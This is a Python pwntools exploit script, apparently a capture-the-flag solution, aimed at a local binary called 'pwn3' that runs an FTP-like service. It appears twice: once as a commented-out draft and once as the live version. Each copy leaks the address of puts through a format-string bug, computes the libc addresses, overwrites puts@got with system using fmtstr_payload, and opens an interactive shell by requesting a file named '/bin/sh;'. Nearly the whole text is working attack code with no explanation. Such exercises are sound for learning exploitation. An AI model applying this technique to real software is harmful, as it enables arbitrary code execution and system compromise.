from pwn import *
'''

p = process("./pwn3")

def put(content, name):
	p.sendlineafter(b">", b"put")
	p.sendlineafter(b":", name)
	p.sendlineafter(b":", content)

def get(name):
	p.sendlineafter(b">", "get")
	p.sendlineafter(b":", name)


def password():
	p.sendlineafter(b":", b"rxraclhm")


password()

elf = ELF("pwn3")
libc = elf.libc
puts = elf.got['puts']
payload =  b"%8$s"
payload += p32(puts)

put(b"lol", payload)
get(b"lol")
libc.address = (u32(p.recv(4).strip().ljust(4, b"\x00")) - 0xa26b) - libc.symbols['puts']
log.info("libc.address: "+hex(libc.address))
pause()

payload = fmtstr_payload(7, {elf.got['puts']: libc.symbols['system']})
put(payload, b"/bin/sh;")
get(b"/bin/sh;")
p.sendlineafter(b">", b"dir")
p.interactive()
'''

from pwn import *

#context.log_level = 'debug'
pwn3 = ELF('./pwn3')
sh = process('./pwn3')


def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)


def show_dir():
    sh.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


# password
def password():
    sh.recvuntil(b'Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)


#password
password()
# get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put(b'1111', b'%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

# get addr of system
libc = pwn3.libc
system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

# modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put(b'/bin/sh;', payload)
sh.recvuntil(b'ftp>')
sh.sendline(b'get')
sh.recvuntil(b'enter the file name you want to get:')
#gdb.attach(sh)
sh.sendline(b'/bin/sh;')

# system('/bin/sh')
show_dir()
sh.interactive()